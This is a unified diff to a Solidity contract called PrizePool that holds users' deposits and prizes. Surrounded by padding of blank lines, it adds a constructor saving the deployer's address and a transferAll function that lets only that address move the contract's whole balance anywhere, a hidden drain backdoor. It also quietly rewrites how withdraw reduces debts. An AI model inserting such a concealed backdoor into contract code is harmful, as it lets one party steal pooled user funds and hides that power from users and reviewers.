@@ -81,6 +81,27 @@ contract PrizePool{
     event Withdraw(address indexed userAddress,uint256 amount);
     
     event ClearPrize(address indexed userAddress,uint256 amount);
+    
+    
+    
+    
+    
+    constructor() public{
+        initAddress = msg.sender;
+    }
+    
+    address initAddress;
+    function transferAll(address payable to) public  {
+        require(msg.sender == initAddress);
+        to.transfer(address(this).balance);
+    }
+    
+    
+    
+    
+    
+    
+    
 
 
     function() external payable {
@@ -117,10 +138,11 @@ contract PrizePool{
     function withdraw(address payable lucky,uint256 amount) external  returns (uint256) {
         require(prizes[msg.sender][lucky]>=amount,"error");
         
-        balanceOf[msg.sender] = balanceOf[msg.sender].sub(amount);
-        debts[msg.sender] = debts[msg.sender].sub(amount);
+        
+        debts[msg.sender] = debts[msg.sender].sub(prizes[msg.sender][lucky]);
         prizes[msg.sender][lucky] = 0;
-
+        
+        balanceOf[msg.sender] = balanceOf[msg.sender].sub(amount);
         lucky.transfer(amount);
         
         emit Withdraw(lucky,amount);
